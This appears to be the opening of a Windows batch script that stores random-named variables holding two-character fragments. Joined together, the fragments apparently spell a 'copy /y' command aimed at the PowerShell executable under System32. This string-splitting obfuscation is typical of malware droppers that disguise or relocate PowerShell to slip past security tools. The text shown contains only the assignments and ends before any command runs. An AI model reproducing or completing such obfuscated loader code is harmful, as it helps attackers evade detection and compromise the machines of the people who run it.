@echo off
set "WJVwhitJYG= /"
set "TBolUmvGYM=ow"
set "fSXXJfjCqA=co"
set "VZbYWrltgy=py"
set "LOlWMfkyPx=0\"
set "unAHEqGmGI=po"
set "PmlEilUycL=em"
set "RCwgIkPLvd=in"
set "QwQLgDdUzL=we"
set "kWxPWRlLWG=32"
set "QsWTioeVnt=nd"
set "toHBAjwEEX=do"
set "DzOjboYAPj=ll"
set "zLtnGIkWJL=\W"
set "CEyyRwdiyy=s\"
set "fTtBPfEBLr=st"
set "UTEeReTYYA=ws"
set "aXOrUIzqhL=Po"
set "npyFhTiino=y "
set "ArxxyJiNkI=xe"
set "bzqTnleSNw=we"
